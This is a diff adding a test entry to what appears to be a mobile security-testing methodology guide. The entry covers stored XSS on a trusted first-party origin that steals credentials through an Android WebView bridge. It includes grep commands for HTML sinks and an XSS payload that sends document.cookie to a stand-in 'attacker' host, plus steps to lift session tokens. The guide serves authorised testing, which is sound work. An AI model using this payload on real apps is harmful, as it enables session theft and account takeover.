@@ -1999,6 +1999,43 @@ read or do?**
 - **Ruled out when:** the flow migrated to the `OnBackPressedCallback`/`OnBackInvokedCallback` API and correctly steps
   WebView history (or the app targets < 36), and no server-side state is left inconsistent.
 
+### D10-072 · Trusted-origin content renders attacker HTML → the allow-list is a non-defence → bridge credential theft
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) as the delivery leg |
+| **Attacker** | AM-05 (another user writes the field) / AM-02 |
+| **Applies to** | apps with a bridge attached to a first-party web origin that renders server-supplied HTML |
+| **Maps to** | HackTricks webview-attacks.md ("Trusted-origin HTML/CRM content → bridge credential theft"); `risks/cross-app-scripting`; MASWE-0033 |
+
+- **Test:** A strict scheme+host allow-list (D10-016) is worthless if the *trusted* origin itself renders
+  attacker-influenceable HTML — CRM banners, loyalty widgets, support-chat bodies, feature-flagged marketing
+  fragments, previews. The allow-list passes because the origin genuinely is first-party; the injection is *on* that
+  origin. The chain: attacker writes a profile/campaign field (often authorised by a **public** customer identifier
+  leaked in invite links, API responses or app resources) → a first-party page fetches the banner/template JSON → an
+  SDK renders it with `innerHTML` → stored XSS on the trusted, allow-listed origin → JS calls a credential-returning
+  bridge (D10-004) and skims the token with a wrapped callback (D10-014).
+- **How:** Trace every attacker-writable field into banners, campaigns, dashboards, previews and loyalty content;
+  check whether the backend authorises the profile read/write with a public identifier. **JSON escaping is not HTML
+  escaping** — after `JSON.parse`, `<img src=x onerror=...>` is live markup, so a field that looks safely
+  JSON-encoded on the wire is not.
+  ```bash
+  grep -RniE 'innerHTML|outerHTML|insertAdjacentHTML|dangerouslySetInnerHTML' assets/www jadx_out/sources
+  grep -RniE 'banner|campaign|template|promo|loyalty|announcement' assets/www jadx_out/sources | grep -iE 'html|render'
+  ```
+  Set the writable field to `<img src=x onerror="new Image().src='https://attacker/?c='+document.cookie">`, open the
+  first-party WebView screen, then swap the payload for the callback-wrap of D10-014 to lift the session token.
+- **Proof:** Your server receives the JWT/session token from a page whose origin is the app's own first-party host —
+  request carries a `; wv` UA, the package in `X-Requested-With` and the first-party `Referer`, proving it ran in the
+  in-app WebView, not a browser. Because the vector is stored and cross-user, one write hits every user who views the
+  content.
+- **Escalation:** → D10-004/D10-014 → D13/D15 ATO; the writable-field-authorised-by-public-id half is itself an
+  IDOR/access-control finding (D07/D13). File the stored-XSS primitive and the bridge consumer separately, then link.
+- **Ruled out when:** every server-supplied fragment the first-party page renders is HTML-escaped at the sink (not
+  merely JSON-encoded on the wire), no bridge method returns a credential (D10-003 negative), and attacker-writable
+  fields cannot reach any WebView-rendered surface.
+
 ## Graveyard for this domain
 
 | Observation | Why it is not a finding | What would make it one |
